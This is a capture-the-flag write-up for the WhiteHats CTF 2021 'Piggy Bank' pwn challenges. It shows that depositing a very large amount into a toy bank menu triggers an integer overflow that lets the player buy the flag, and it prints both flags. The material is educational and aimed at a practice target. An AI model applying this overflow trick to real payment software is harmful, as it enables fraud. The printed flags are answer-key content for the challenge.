---
layout: writeup
ctf: WhiteHats CTF 2021
chal: Piggy_Bank / Piggy_Bank_Revenge
category: pwn
flag: WH2021{N0w_the_p1ggy_is_wORS3_than_empty_:'(} / WH2021{(Don't)Try_th1s_0n_youR_B4nk!}
points: 287 / 539
solves: 64 / 51
---

Piggy bank

> Time to save your angbao money! $\_$

Piggy bank revenge:

> Seems there was an issue with the previous implementation. I've introduced a HOTFIX that should prevent any further vulnerabilities. I've achieved an unhackable piggy bank now for sure.

My solution for both was purely by fuzzing, when connecting to the netcat server provided, we see a simple bank menu:

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
```

Immediately one thinks 'how can someone implementing this mess up'. The easiest way is to allow depositing negative amounts of money, and in C negative values are stored as 'a very big integer', so let's try to input big integers. This immediately allows us to buy the flag in both challenges.

Piggy bank:

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $200000000

Piggy Bank value: $-14747027.-80
Wallet value:     $14748464.80

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 3

WH2021{N0w_the_p1ggy_is_wORS3_than_empty_:'(}
```

Piggy bank revenge:

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $200000000

Piggy Bank value: $-14747027.-80
Wallet value:     $14748464.80

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 3

WH2021{(Don't)Try_th1s_0n_youR_B4nk!}
```
